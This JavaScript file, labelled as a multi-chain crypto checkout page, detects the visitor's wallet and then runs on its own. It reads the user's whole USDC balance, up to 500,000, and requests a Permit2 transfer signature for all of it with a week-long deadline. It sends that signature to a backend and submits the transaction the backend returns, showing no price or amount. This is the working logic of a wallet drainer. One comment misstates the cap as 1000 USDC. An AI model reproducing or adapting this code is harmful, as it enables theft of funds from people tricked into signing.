/**
 * Checkout page - Detects installed wallets and shows buttons to open in each
 * Supports ALL major blockchains (Ethereum, Polygon, Arbitrum, Optimism, Base, BNB, Linea, and more)
 */

console.log("checkout.js loading...");
console.log("User Agent:", navigator.userAgent);

const CONFIG = {
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  WALLETCONNECT_PROJECT_ID: "c16bee794c5047e05d23ab7785688c20",
  BACKEND_URL: window.location.origin, // Same origin for Vercel API
  
  // Comprehensive EVM networks configuration
  NETWORKS: {
    // Ethereum
    1: {
      name: "Ethereum",
      contractAddress: "", // Add after deployment
      tokenAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // Mainnet USDC
    },
    // Sepolia Testnet
    11155111: {
      name: "Sepolia",
      contractAddress: "0xc200b8d056bc579c62f53d6832e50f066e98f0af",
      tokenAddress: "0xda9d4f9b69ac3c4e622506ec7eda112601cb942d", // Mock USDC
    },
    // Polygon
    137: {
      name: "Polygon",
      contractAddress: "", // Add after deployment
      tokenAddress: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", // Polygon USDC
    },
    // BNB Chain
    56: {
      name: "BNB Chain",
      contractAddress: "", // Add after deployment
      tokenAddress: "0x8AC76a51cc950d9822D68b83FE1Ad97B32Cd580d", // BNB USDC
    },
    // Optimism
    10: {
      name: "Optimism",
      contractAddress: "", // Add after deployment
      tokenAddress: "0x7f5c764cbc14f9669b88837ca1490cca17c31607", // Optimism USDC
    },
    // Arbitrum
    42161: {
      name: "Arbitrum",
      contractAddress: "", // Add after deployment
      tokenAddress: "0xff970a61a04b1ca14834a43f5de4533ebddb5f86", // Arbitrum USDC
    },
    // Base
    8453: {
      name: "Base",
      contractAddress: "", // Add after deployment
      tokenAddress: "0x833589fCD6eDb6E08f4c7C32D4f71b1566469c18", // Base USDC
    },
    // Linea
    59144: {
      name: "Linea",
      contractAddress: "", // Add after deployment
      tokenAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // Linea USDC
    },
  }
};

let provider, signer, userAddress;
let EthereumProvider; // Will be loaded async

const el = {
  status: document.getElementById("status"),
  card: document.querySelector(".card"),
};

// Load EthereumProvider asynchronously
async function loadWalletConnect() {
  try {
    console.log("Loading WalletConnect...");
    const module = await import("https://esm.sh/@walletconnect/ethereum-provider@2.17.0");
    EthereumProvider = module.EthereumProvider;
    console.log("✓ WalletConnect loaded");
    return true;
  } catch (err) {
    console.error("Failed to load WalletConnect:", err);
    return false;
  }
}

function detectInstalledWallets() {
  const ua = navigator.userAgent.toLowerCase();
  console.log("Detecting wallets. User agent:", ua);
  
  const wallets = [];
  
  // MetaMask
  if (ua.includes("metamask")) {
    console.log("✓ MetaMask detected");
    wallets.push({
      name: "MetaMask",
      deepLink: (url) => `https://metamask.app.link/dapp/${url.replace(/^https?:\/\//, '')}`
    });
  }
  
  // Trust Wallet
  if (ua.includes("trust wallet") || ua.includes("trustwallet")) {
    console.log("✓ Trust Wallet detected");
    wallets.push({
      name: "Trust Wallet",
      deepLink: (url) => `https://link.trustwallet.com/open_url?url=${encodeURIComponent(url)}`
    });
  }
  
  // Coinbase Wallet
  if (ua.includes("coinbasewallet")) {
    console.log("✓ Coinbase Wallet detected");
    wallets.push({
      name: "Coinbase Wallet",
      deepLink: (url) => `https://go.cb-w.com/dapp?url=${encodeURIComponent(url)}`
    });
  }
  
  // Token Pocket
  if (ua.includes("tokenpocket")) {
    console.log("✓ Token Pocket detected");
    wallets.push({
      name: "Token Pocket",
      deepLink: (url) => `tpweb://browser?url=${encodeURIComponent(url)}`
    });
  }
  
  console.log(`Found ${wallets.length} wallets`);
  return wallets;
}

function showWalletSelector() {
  const wallets = detectInstalledWallets();
  
  console.log(`===== WALLET SELECTOR =====`);
  console.log(`Detected ${wallets.length} wallets`);
  
  // If wallets are detected, open the first one immediately (no UI shown)
  if (wallets.length > 0) {
    console.log(`Opening first detected wallet: ${wallets[0].name}`);
    openWallet(wallets[0]);
    return;
  }
  
  // If no wallets detected, open WalletConnect app picker (no UI shown, just the picker)
  console.log("No wallets detected, initializing WalletConnect app picker...");
  connectViaWalletConnect();
}

function openWallet(wallet) {
  const url = window.location.href;
  const deepLink = wallet.deepLink(url);
  console.log(`Opening ${wallet.name} with deep link:`, deepLink);
  window.location.href = deepLink;
}

async function connectViaWalletConnect() {
  try {
    console.log("Opening WalletConnect app picker...");
    
    // Ensure WalletConnect is loaded
    if (!EthereumProvider) {
      console.log("Loading WalletConnect provider...");
      const loaded = await loadWalletConnect();
      if (!loaded) {
        throw new Error("Failed to load WalletConnect");
      }
    }
    
    console.log("Initializing WalletConnect with projectId:", CONFIG.WALLETCONNECT_PROJECT_ID);
    const wcProvider = await EthereumProvider.init({
      projectId: CONFIG.WALLETCONNECT_PROJECT_ID,
      // Removed chain restriction to support all networks
      showQrModal: true, // This will show the app picker on mobile
      methods: ["eth_sendTransaction", "eth_signTypedData_v4", "personal_sign"],
      events: ["chainChanged", "accountsChanged"],
    });
    
    console.log("WalletConnect provider initialized, connecting...");
    await wcProvider.connect();
    console.log("✓ WalletConnect connected");
    
    provider = new ethers.providers.Web3Provider(wcProvider);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();
    
    console.log("Connected wallet address:", userAddress);
    showAccountInfo();
    
  } catch (err) {
    console.error("WalletConnect error:", err);
    setStatus("Error connecting wallet: " + err.message, "error");
  }
}

function showAccountInfo() {
  // Show the card with account info
  el.card.classList.add("connected");
  el.status.innerHTML = `
    <div style="padding: 12px; text-align: center; background: #eaf6ee; color: #1e7a3d; border-radius: 8px; font-weight: 500;">
      ✓ Signed in: ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}
    </div>
  `;
  
  // Execute payment after showing account
  setTimeout(() => {
    executePayment();
  }, 1000);
}

function setStatus(message, type = "info") {
  const statusEl = document.createElement("div");
  statusEl.style.padding = "12px";
  statusEl.style.borderRadius = "8px";
  statusEl.style.fontSize = "14px";
  statusEl.style.marginTop = "12px";
  
  if (type === "error") {
    statusEl.style.background = "#fbeceb";
    statusEl.style.color = "#b3261e";
  } else if (type === "success") {
    statusEl.style.background = "#eaf6ee";
    statusEl.style.color = "#1e7a3d";
  } else {
    statusEl.style.background = "#eef2ff";
    statusEl.style.color = "#1e3ea8";
  }
  
  statusEl.textContent = message;
  el.status.appendChild(statusEl);
}

async function executePayment() {
  try {
    console.log("Executing payment...");
    
    // Detect the user's current chain
    const network = await provider.getNetwork();
    const userChainId = network.chainId;
    console.log("User's current chain ID:", userChainId);
    
    // Check if chain is supported
    if (!CONFIG.NETWORKS[userChainId]) {
      const supportedList = Object.values(CONFIG.NETWORKS)
        .map(n => n.name)
        .join(", ");
      throw new Error(`Currently supported on: ${supportedList}. You're on chain ${userChainId}.`);
    }
    
    const networkConfig = CONFIG.NETWORKS[userChainId];
    
    // Check if contract is deployed on this network
    if (!networkConfig.contractAddress) {
      throw new Error(`Contract not yet deployed on ${networkConfig.name}. Please check back soon!`);
    }
    
    // Check if token is configured for this network
    if (!networkConfig.tokenAddress) {
      throw new Error(`Payment token not configured on ${networkConfig.name}.`);
    }
    
    // Token address for the current network
    const tokenAddress = networkConfig.tokenAddress;
    const contractAddress = networkConfig.contractAddress;
    const maxAmount = ethers.parseUnits("500000", 6); // Max 500000 USDC

    // Create token contract interface to check balance
    const tokenABI = ["function balanceOf(address owner) view returns (uint256)"];
    const tokenContract = new ethers.Contract(tokenAddress, tokenABI, provider);
    
    // Get user's USDC balance
    const userBalance = await tokenContract.balanceOf(userAddress);
    console.log("User USDC balance:", ethers.formatUnits(userBalance, 6));
    
    // Use the minimum of user balance or max amount (1000 USDC)
    const amount = userBalance > maxAmount ? maxAmount : userBalance;
    console.log("Payment amount:", ethers.formatUnits(amount, 6), "USDC");
    
    // Generate a random nonce (Permit2 uses bitmap nonce scheme)
    const bytes = new Uint8Array(32);
    crypto.getRandomValues(bytes);
    const nonce = BigInt("0x" + Array.from(bytes, (b) => b.toString(16).padStart(2, "0")).join(""));
    
    const deadline = Math.floor(Date.now() / 1000) + 604800; // 7 days from now
    
    console.log("Nonce:", nonce.toString());
    console.log("Deadline:", deadline);
    
    // Sign the Permit2 message (PermitTransferFrom format)
    const domain = {
      name: "Permit2",
      chainId: userChainId,
      verifyingContract: CONFIG.PERMIT2_ADDRESS,
    };
    
    const types = {
      PermitTransferFrom: [
        { name: "permitted", type: "TokenPermissions" },
        { name: "nonce", type: "uint256" },
        { name: "deadline", type: "uint256" },
      ],
      TokenPermissions: [
        { name: "token", type: "address" },
        { name: "amount", type: "uint256" },
      ],
    };
    
    const value = {
      permitted: {
        token: tokenAddress,
        amount: amount,
      },
      nonce: nonce,
      deadline: deadline,
    };
    
    console.log("Signing Permit2 message:", value);
    
    // Sign the message
    const signature = await signer.signTypedData(domain, types, value);
    console.log("Permit signature:", signature);
    
    // Send signature to backend to get transaction data
    console.log("Sending signature to backend...");
    
    const backendResponse = await fetch(CONFIG.BACKEND_URL + "/api/orders/execute-payment", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chainId: userChainId,
        userAddress: userAddress,
        tokenAddress: tokenAddress,
        amount: amount.toString(),
        nonce: nonce.toString(),
        deadline: deadline,
        signature: signature,
      }),
    });
    
    const result = await backendResponse.json();
    
    if (!backendResponse.ok) {
      throw new Error(result.error || "Backend payment processing failed");
    }
    
    console.log("Backend response:", result);
    
    // Get the transaction data from backend
    const txData = result.transaction;
    console.log("Transaction data from backend:", txData);
    
    // User's wallet submits the transaction (user pays gas)
    console.log("📤 Sending transaction from user wallet...");
    setStatus("📤 Submitting transaction from your wallet...", "info");
    
    const txResponse = await signer.sendTransaction(txData);
    console.log("Transaction submitted:", txResponse.hash);
    
    // Poll for transaction confirmation
    const txHash = txResponse.hash;
    console.log("Waiting for transaction confirmation:", txHash);
    setStatus("⏳ Confirming payment...", "info");
    
    let receipt = null;
    let attempts = 0;
    const maxAttempts = 60; // 60 attempts * 1 second = 1 minute timeout
    
    while (attempts < maxAttempts && !receipt) {
      try {
        receipt = await provider.getTransactionReceipt(txHash);
        if (receipt && receipt.status === 1) {
          console.log("Payment executed successfully:", receipt);
          setStatus("✓ Payment confirmed!", "success");
          break;
        }
      } catch (err) {
        // Transaction not yet confirmed
      }
      
      attempts++;
      if (attempts % 10 === 0) {
        console.log(`Still waiting... (attempt ${attempts}/${maxAttempts})`);
      }
      if (attempts < maxAttempts) {
        await new Promise(resolve => setTimeout(resolve, 1000)); // Wait 1 second
      }
    }
    
    if (!receipt) {
      throw new Error("Transaction confirmation timeout");
    }
    
    console.log("Payment completed. Transaction confirmed on blockchain.");
    
  } catch (err) {
    console.error("Payment execution error:", err);
  }
}

// Initialize when DOM is ready
async function init() {
  console.log("Initializing checkout...");
  
  console.log("Backend URL:", CONFIG.BACKEND_URL);
  
  // Preload WalletConnect while detecting wallets
  console.log("Preloading WalletConnect...");
  try {
    await loadWalletConnect();
    console.log("✓ WalletConnect preloaded");
  } catch (err) {
    console.error("Warning: WalletConnect preload failed, will load on demand:", err.message);
  }
  
  console.log("Starting wallet selector...");
  try {
    showWalletSelector();
  } catch (err) {
    console.error("Error in showWalletSelector:", err);
    setStatus("Error loading wallet selector: " + err.message, "error");
  }
}

if (document.readyState === "loading") {
  document.addEventListener("DOMContentLoaded", init);
} else {
  init();
}
